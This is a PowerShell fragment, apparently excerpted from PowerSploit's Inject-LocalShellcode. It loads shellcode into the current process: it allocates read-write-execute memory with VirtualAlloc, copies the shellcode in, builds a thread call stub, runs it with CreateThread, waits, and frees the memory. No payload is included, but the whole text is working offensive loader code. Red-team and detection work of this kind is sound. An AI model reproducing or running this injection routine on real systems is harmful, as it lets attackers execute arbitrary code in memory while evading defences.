
# Uses Inject-LocalShellcode from Powersploit

$BaseAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)

# Copy shellcode to RWX buffer
[System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $BaseAddress, $Shellcode.Length)

# Get address of ExitThread function
$ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread

$CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 64

# Allocate RWX memory for the thread call stub
$CallStubAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallStub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)

# Copy call stub to RWX buffer
[System.Runtime.InteropServices.Marshal]::Copy($CallStub, 0, $CallStubAddress, $CallStub.Length)

# Launch shellcode in it's own thread
$ThreadHandle = $CreateThread.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $BaseAddress, 0, [IntPtr]::Zero)

# Wait for shellcode thread to terminate
$WaitForSingleObject.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null

$VirtualFree.Invoke($CallStubAddress, $CallStub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
$VirtualFree.Invoke($BaseAddress, $Shellcode.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
